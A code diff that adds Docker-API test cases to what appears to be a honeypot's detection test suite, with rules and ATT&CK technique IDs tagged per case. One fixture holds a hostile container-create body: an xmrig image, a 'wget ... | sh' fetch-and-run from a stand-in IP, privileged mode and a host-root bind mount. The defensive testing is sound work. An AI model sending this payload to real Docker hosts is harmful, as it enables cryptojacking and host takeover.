@@ -780,6 +780,57 @@ ROWS = [
 ]
 
 
+def _docker(*reqs: Req) -> list[Any]:
+    from fastapi.testclient import TestClient
+
+    from decoys.dockerapi.app import app
+
+    client = TestClient(app, client=(IP, 40404))
+    client.headers["user-agent"] = "Go-http-client/1.1"
+    return [client.request(r.method, r.path, **r.kwargs) for r in reqs]
+
+
+_MINER_BODY = (
+    '{"Image":"xmrig/xmrig","Cmd":["sh","-c","wget http://203.0.113.9/x.sh -O- | sh"],'
+    '"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
+)
+
+ROWS += [
+    pytest.param(
+        Row(
+            "docker",
+            lambda: _docker(get("/_ping"), post("/v1.43/containers/create", content=_MINER_BODY)),
+            lambda rs: rs[0].text == "OK" and rs[1].status_code == 201,
+            logged=("http_request",),
+            rules=_ids("R5"),
+            attack=_ids("T1610", "T1611", "T1496", "T1059.004"),
+        ),
+        id="docker-miner-create-privileged",
+    ),
+    pytest.param(
+        Row(
+            "docker",
+            lambda: _docker(post("/containers/abc123/exec", content='{"Cmd":["id"]}')),
+            lambda rs: rs[0].status_code == 201,
+            logged=("http_request",),
+            rules=_ids("R5"),
+            attack=_ids("T1610"),
+        ),
+        id="docker-exec",
+    ),
+    pytest.param(
+        Row(
+            "docker",
+            lambda: _docker(get("/_ping"), get("/version"), get("/containers/json")),
+            lambda rs: rs[0].text == "OK" and rs[1].json()["Version"] == "24.0.7",
+            logged=("http_request",),
+            benign=True,
+        ),
+        id="docker-read-only-browsing",
+    ),
+]
+
+
 @pytest.mark.parametrize("row", ROWS)
 def test_attack_is_detected(read_events, row: Row) -> None:
     replies = row.drive()
